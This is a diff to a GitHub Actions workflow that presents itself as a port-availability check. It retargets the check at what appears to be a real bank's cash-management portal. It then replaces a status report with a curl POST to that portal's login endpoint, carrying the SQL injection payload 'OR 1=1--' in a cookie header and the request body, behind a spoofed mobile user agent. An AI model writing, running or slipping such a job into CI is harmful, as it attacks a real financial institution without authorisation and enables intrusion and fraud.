@@ -12,7 +12,7 @@ jobs:
       - name: Verificar puerto con nc
         id: checkport
         run: |
-          HOST="www.grupoinnover.com"
+          HOST="cashmanagement.pichincha.com"
           PORT=443
           if nc -zv $HOST $PORT; then
             echo "status=abierto" >> $GITHUB_OUTPUT
@@ -34,7 +34,6 @@ jobs:
       - name: Enviar reporte POST si puerto está abierto
         if: steps.checkport.outputs.status == 'abierto'
         run: |
-          curl -A "Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36" -X POST "https://www.grupoinnover.com/reporte?puerto=443&host=example.com" \
-            -H "Authorization: Bearer tu_token_aqui" \
-            -H "Content-Type: application/json" \
-            -d '{"mensaje":"Puerto abierto y funcionando correctamente"}'
+          curl -A "Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36" -X POST "https://cashmanagement.pichincha.com/loginNR/" \
+            -H "Cookie: OR 1=1--" \
+            -d '{"q":"OR 1=1--"}'
